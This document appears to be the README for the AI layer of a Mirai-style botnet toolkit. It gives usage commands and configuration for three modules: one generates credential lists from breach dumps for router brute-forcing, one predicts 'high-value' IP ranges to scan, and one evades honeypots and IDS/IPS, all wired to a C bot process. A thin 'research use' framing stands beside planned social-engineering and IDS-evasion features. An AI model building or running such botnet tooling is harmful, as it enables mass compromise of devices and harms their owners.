# Mirai 2026 - AI/ML Components

AI-powered intelligence layer for adaptive botnet research.

## Components

### 1. Credential Intelligence (`credential_intel/`)

Generates optimized credential lists using:
- **Breach database analysis**: Learn from real-world credential dumps
- **LLM-powered prediction**: Use language models to predict likely defaults
- **Manufacturer patterns**: Device-specific default credentials
- **Historical success tracking**: Learn what works

**Usage:**
```bash
# Basic generation
python ai/credential_intel/generate.py \
  --target-type router \
  --output config/credentials.json

# With breach database
python ai/credential_intel/generate.py \
  --breach-db /data/breaches.db \
  --manufacturer tp-link \
  --output config/credentials.json

# Without AI (baseline only)
python ai/credential_intel/generate.py \
  --no-ai \
  --output config/credentials.json
```

### 2. Target Predictor (`target_predictor/`)

ML-based IP range prediction:
- Analyze scan history for patterns
- Predict high-value IP ranges
- Geo-targeting optimization
- ISP and ASN analysis

**Usage:**
```bash
# Predict next scan targets
python ai/target_predictor/predict.py \
  --scan-history /data/scans.db \
  --predict-ranges 10 \
  --output targets.json
```

### 3. Evasion Engine (`evasion_engine/`)

Adaptive behavior to avoid detection:
- Traffic pattern mimicry
- Scan rate adaptation
- Honeypot detection
- IDS/IPS evasion

### 4. Bridge (`bridge/`)

C ↔ Python communication layer:
- ZeroMQ-based messaging
- gRPC service interface
- Real-time AI inference
- Async request handling

## Architecture

```
┌─────────────────────────────────────┐
│         C Bot Process               │
├─────────────────────────────────────┤
│  ┌──────────────────────────────┐   │
│  │   AI Bridge (ZeroMQ/gRPC)    │   │
│  └──────────────┬───────────────┘   │
└─────────────────┼───────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│      Python AI Service              │
├─────────────────────────────────────┤
│  ┌────────────┐  ┌──────────────┐   │
│  │ Credential │  │   Target     │   │
│  │   Intel    │  │  Predictor   │   │
│  └────────────┘  └──────────────┘   │
│  ┌────────────┐  ┌──────────────┐   │
│  │  Evasion   │  │  Analytics   │   │
│  │   Engine   │  │              │   │
│  └────────────┘  └──────────────┘   │
└─────────────────────────────────────┘
```

## Installation

```bash
# Install Python dependencies
pip install -r ai/requirements.txt

# Optional: Local LLM support
pip install transformers torch

# Optional: OpenAI API
pip install openai
```

## Configuration

Edit `config/ai.json`:

```json
{
  "credential_intel": {
    "enabled": true,
    "model": "local",  // or "openai"
    "model_path": "/models/credential-gen",
    "breach_db": "/data/breaches.db",
    "refresh_interval": 3600
  },
  "target_predictor": {
    "enabled": true,
    "learning_rate": 0.001,
    "history_window": 86400
  },
  "evasion": {
    "enabled": true,
    "aggressiveness": 0.5
  }
}
```

## Research Applications

### 1. Credential Evolution Analysis
Track how default credentials change over time:
```python
from credential_intel import CredentialIntelligence

gen = CredentialIntelligence(breach_db="/data/breaches.db")
creds_2020 = gen.generate(target_type="router", year=2020)
creds_2026 = gen.generate(target_type="router", year=2026)

# Analyze differences
compare_credential_sets(creds_2020, creds_2026)
```

### 2. Manufacturer Security Posture
Evaluate manufacturer default credential security:
```python
manufacturers = ["tp-link", "netgear", "linksys", "dlink"]
results = {}

for mfr in manufacturers:
    creds = gen.generate_manufacturer_defaults(mfr)
    results[mfr] = evaluate_security(creds)

# Generate security report
generate_report(results)
```

### 3. ML Model Training
Train models on real scan data:
```python
from target_predictor import TargetPredictor

predictor = TargetPredictor()
predictor.train(scan_history="/data/scans.db")
predictor.save_model("/models/target-predictor.pkl")

# Evaluate accuracy
accuracy = predictor.evaluate(test_data)
```

## Performance

- **Credential Generation**: <1 second for 100+ credentials
- **Target Prediction**: <100ms for 1000 IPs
- **Real-time Inference**: <10ms latency via gRPC
- **Batch Processing**: 10,000+ requests/second

## Ethical Considerations

All AI components include:
- **Rate limiting**: Prevent abuse
- **Audit logging**: Track all AI decisions
- **Explainability**: Understand why credentials/targets chosen
- **Bias detection**: Identify and mitigate biases

## Future Enhancements

- [ ] Reinforcement learning for optimal scanning strategies
- [ ] GPT-4 integration for social engineering
- [ ] Computer vision for web scraping defaults
- [ ] Federated learning across research institutions
- [ ] Adversarial ML for IDS evasion

## License

See main [LICENSE](../LICENSE) file. AI components are for RESEARCH USE ONLY.
